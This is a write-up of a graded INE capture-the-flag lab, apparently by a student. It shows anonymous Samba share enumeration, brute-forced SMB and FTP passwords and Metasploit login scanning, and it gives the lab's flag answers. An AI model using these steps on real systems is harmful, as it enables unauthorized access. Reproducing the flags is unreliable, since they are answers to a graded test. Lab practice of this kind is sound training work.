## Completing Skill Check Labs
Skill Check Labs are interactive, hands-on exercises designed to validate the knowledge and skills you’ve gained in this course through real-world scenarios. Each lab presents practical tasks that require you to apply what you’ve learned. Unlike other INE labs, solutions are not provided, challenging you to demonstrate your understanding and problem-solving abilities. Your performance is graded, allowing you to track progress and measure skill growth over time.

## Lab Environment
A Linux machine is accessible at target.ine.local. Identify the services running on the machine and capture the flags. The flag is an md5 hash format.

## Scan ports
    PORT STATE  SERVICE VERSION
    21/tcp   closed ftp
    139/tcp  open   netbios-ssn Samba smbd 4.6.2
    445/tcp  open   netbios-ssn Samba smbd 4.6.2
    5554/tcp open   ftp vsftpd 2.0.8 or later


## Flag 1: There is a samba share that allows anonymous access. Wonder what's in there!

    for share in $(cat /root/Desktop/wordlists/shares.txt); do
        if smbclient //target.ine.local/$share -c 'ls' 2>/dev/null; then
          echo "[+] $share"
        fi
    done
    smbclient //target.ine.local/pubfiles 
        FLAG1{c5287fc5dde14d5e845a27d4955a32dc}

## Flag 2: One of the samba users have a bad password. Their private share with the same name as their username is at risk!
    brute force smb users
    josh:purple
    smbclient   //target.ine.local/josh  -U josh%purple
        FLAG2{524497c5d66043be86b2cd43361be29f}

## Flag 3: Follow the hint given in the previous flag to uncover this one.
    msf6 exploit(unix/ftp/vsftpd_234_backdoor) > ftp -p target.ine.local 5554
        ftp -p target.ine.local 5554
        Connected to target.ine.local.
        220 Welcome to blah FTP service. Reminder to users, specifically ashley, alice and amanda to change their weak passwords immediately!!!
        Name (target.ine.local:root): 

    ## bruce force: ashley, alice , amanda
        msf6 auxiliary(scanner/ftp/ftp_login) > run
            alice:pretty

        ftp target.ine.local -p 5554
            ftp> ls
                -rw-rw-r--1 00  40 Feb 25 14:36 flag3.txt
                    FLAG3{6dd92bb1567f40218d1d40646eabe95b}

## Flag 4: This is a warning meant to deter unauthorized users from logging in.
    ssh josh@target.ine.local  
        Is this what you're looking for?: FLAG4{df9c49dd998e4a77bf65cf10d5d8899a}   


## Note: The wordlists located in the following directory will be useful:
    /root/Desktop/wordlists

## Tools
    Nmap
    Metasploit
    Hydra
    enum4linux
    smbclient
    smbmap